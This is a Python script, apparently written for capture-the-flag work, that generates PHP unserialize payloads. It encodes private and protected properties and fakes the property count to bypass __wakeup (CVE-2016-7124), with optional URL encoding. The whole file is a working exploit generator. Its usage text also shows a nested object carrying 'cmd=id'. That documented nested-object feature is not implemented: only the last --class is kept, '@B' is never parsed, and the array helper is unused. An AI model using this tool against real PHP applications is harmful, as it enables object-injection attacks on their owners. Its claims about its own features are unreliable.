#!/usr/bin/env python
"""phpser · PHP 序列化 payload 生成器

支持 public / protected / private 属性、嵌套对象、数组、伪造属性个数（CVE-2016-7124）。

用法示例：
    # 生成这道题的 payload
    python phpser.py --class Name --private username=admin --private password=100 --fake-count 3 --urlencode

    # 只生成原始串
    python phpser.py --class Name --private username=admin --private password=100 -f 3

    # 嵌套对象
    python phpser.py --class A --private obj='@B' --class B --private cmd=id
"""
from __future__ import annotations

import argparse
import sys
import urllib.parse


class PS:
    """PHP 序列化片段构造。"""

    @staticmethod
    def s(value) -> str:
        """字符串：s:长度:"内容";  长度按 UTF-8 字节算。"""
        if isinstance(value, str):
            raw = value.encode("utf-8")
            return "s:" + str(len(raw)) + ':"' + value + '";'
        raise TypeError("PS.s 只接受 str")

    @staticmethod
    def i(value) -> str:
        return "i:" + str(int(value)) + ";"

    @staticmethod
    def d(value) -> str:
        return "d:" + repr(float(value)) + ";"

    @staticmethod
    def b(value) -> str:
        return "b:" + ("1" if value else "0") + ";"

    @staticmethod
    def n() -> str:
        return "N;"

    @staticmethod
    def arr(items, count=None) -> str:
        """items: [(key, PS片段), ...]"""
        n = count if count is not None else len(items)
        body = "".join(str(k) + v for k, v in items)
        return "a:" + str(n) + ":{" + body + "}"

    @staticmethod
    def obj(cls: str, props, count=None) -> str:
        """props: [(可见性, 属性名, PS片段), ...]
        可见性: public / protected / private
        count: 伪造的属性个数，用于绕过 __wakeup（CVE-2016-7124）
        """
        n = count if count is not None else len(props)
        body = ""
        for vis, name, frag in props:
            if vis == "private":
                real = "\x00" + cls + "\x00" + name
            elif vis == "protected":
                real = "\x00*\x00" + name
            else:
                real = name
            body += PS.s(real) + frag
        return "O:" + str(len(cls.encode("utf-8"))) + ':"' + cls + '":' + str(n) + ":{" + body + "}"


VALUE_TYPES = {
    "str": PS.s,
    "int": PS.i,
    "float": PS.d,
    "bool": PS.b,
}


def build(args) -> str:
    props = []
    for vis in ("public", "protected", "private"):
        for item in getattr(args, vis) or []:
            if "=" not in item:
                sys.exit(f"--{vis} 需要一个 k=v，收到 {item!r}")
            k, v = item.split("=", 1)
            props.append((vis, k, PS.s(v)))
    for item in args.int or []:
        if "=" not in item:
            sys.exit(f"--int 需要一个 k=v，收到 {item!r}")
        k, v = item.split("=", 1)
        props.append((args.vis_default, k, PS.i(v)))
    for item in args.bool or []:
        if "=" not in item:
            sys.exit(f"--bool 需要一个 k=v，收到 {item!r}")
        k, v = item.split("=", 1)
        props.append((args.vis_default, k, PS.b(v.lower() in ("1", "true", "yes"))))

    if not props:
        sys.exit("至少要有一个属性")

    fake = args.fake_count
    if fake is not None and fake <= len(props):
        print(f"[提示] fake-count={fake} 不大于属性数 {len(props)}，不会触发 CVE-2016-7124", file=sys.stderr)

    return PS.obj(args.cls, props, count=fake)


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="phpser",
        description="PHP 序列化 payload 生成器（支持伪造属性数绕过 __wakeup）")
    ap.add_argument("--class", dest="cls", required=True, help="类名，如 Name")
    ap.add_argument("--public", action="append", help="公有属性 k=v，可多次")
    ap.add_argument("--protected", action="append", help="保护属性 k=v，可多次")
    ap.add_argument("--private", action="append", help="私有属性 k=v，可多次")
    ap.add_argument("--int", action="append", help="整数属性 k=v，可多次")
    ap.add_argument("--bool", action="append", help="布尔属性 k=v，可多次")
    ap.add_argument("--vis-default", default="public",
                    choices=["public", "protected", "private"],
                    help="--int/--bool 用哪种可见性，默认 public")
    ap.add_argument("-f", "--fake-count", type=int,
                    help="伪造的属性个数，大于实际个数即可绕过 __wakeup")
    ap.add_argument("-u", "--urlencode", action="store_true", help="顺手输出 URL 编码版")
    args = ap.parse_args()

    payload = build(args)
    print("原始:")
    print(payload)
    print()
    print("字节数:", len(payload.encode("utf-8")))
    if args.urlencode:
        print()
        print("URL 编码:")
        print(urllib.parse.quote(payload, safe=""))
    return 0


if __name__ == "__main__":
    sys.exit(main())
